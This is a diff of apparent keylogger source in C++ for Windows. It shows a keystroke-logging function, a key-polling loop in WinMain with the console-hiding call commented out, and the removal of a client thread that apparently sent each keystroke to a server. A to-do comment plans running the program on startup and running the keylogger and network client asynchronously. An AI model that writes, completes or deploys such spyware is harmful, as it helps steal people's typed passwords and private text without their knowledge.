@@ -30,9 +30,7 @@ void writeKeyStroke(int trueKey)
     } 
     else 
     {
-        std::thread clientThread(client, &trueKeyC);
         file << trueKeyC;
-        clientThread.join();
     }
     file.close();
 }
@@ -43,7 +41,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     //FreeConsole();
     Maps vkMaps;
     vkMaps.initializeMaps();
-    while (1)
+    while (true)
     {
         for (int i = 1; i < 254; i++)
         {
@@ -83,9 +81,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     To-Do list
 
     in ks2server.cpp:
-    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely.
-    ~ maybe seggregate the code that resolves dns to ipv4 format into a separate header file. 
-    ~ ensure proper spacing between code statements to improve readability.
+    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
     ~ find a way to run keylogger and client model asynchronously.
 */
